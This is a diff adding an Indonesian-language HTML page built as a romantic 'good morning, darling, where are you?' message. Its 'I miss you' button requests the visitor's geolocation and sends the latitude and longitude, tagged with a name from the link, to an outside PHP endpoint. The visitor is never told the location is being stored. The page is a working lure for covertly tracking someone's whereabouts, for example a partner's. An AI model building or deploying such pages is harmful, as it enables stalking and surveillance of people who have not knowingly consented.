@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Enchanted</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Comic Sans MS', cursive;
+      background-image: url('https://cdn.jsdelivr.net/gh/dandelions10/background12@main/Floryn_infobox.jpg');
+      background-size: cover;
+      background-position: center;
+      color: white;
+      text-shadow: 1px 1px 2px black;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      backdrop-filter: brightness(0.8);
+    }
+    .container {
+      text-align: center;
+      background: rgba(0,0,0,0.4);
+      padding: 20px;
+      border-radius: 20px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 12px;
+      background-color: pink;
+      color: black;
+      font-size: 1.2em;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background-color: hotpink;
+    }
+  </style>
+</head>
+<body>
+  <audio autoplay loop>
+    <source src="https://cdn.jsdelivr.net/gh/dandelions10/Sound-Html@main/audio-enc.mp3" type="audio/mpeg" />
+  </audio>
+
+  <div class="container">
+    <h2>Selamat pagi, sayang 🥺</h2>
+    <p>Kamu lagi ngapain? Udah mandi belum?</p>
+    <p>Eh, kamu dimana sih sekarang?</p>
+    <button onclick="getLocation()">Aku Kangen Kamu 😳</button>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        alert("Browser kamu tidak mendukung lokasi.");
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      // Ganti URL backend ini ke domain InfinityFree kamu yang benar
+      const url = "https://dandelions.kesug.com/enchanted/save-location.php";
+      const nama = new URLSearchParams(window.location.search).get("nama") || "Tanpa Nama";
+
+      fetch(url, {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: `latitude=${lat}&longitude=${lon}&nama=${nama}`
+      }).then(() => {
+        alert("Makasih ya udah jujur 😘");
+      }).catch(() => {
+        alert("Gagal mengirim lokasi, tapi aku tetap percaya kamu 🥺");
+      });
+    }
+
+    function showError() {
+      alert("Gagal mendapatkan lokasi, tapi aku tetap percaya kamu 🥺");
+    }
+  </script>
+</body>
+</html>
